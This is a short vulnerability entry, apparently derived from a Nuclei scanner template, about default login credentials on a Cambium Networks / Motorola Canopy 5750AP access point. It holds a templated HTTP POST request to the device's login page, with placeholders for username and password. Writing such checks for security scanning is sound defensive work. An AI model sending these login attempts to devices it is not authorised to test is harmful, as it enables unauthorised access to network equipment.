# Vulnerability: Canopy 5.7GHz Access Point - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`cambium-networks-default-login.yaml`)

## Description
Cambium Networks / Motorola Canopy 5750AP ADVANTAGE Access Point 5.7GHz login credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login.cgi  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

&Session=0&CanopyUsername={{username}}&CanopyPassword={{password}}&login=Login&webguisubmit=submit
```

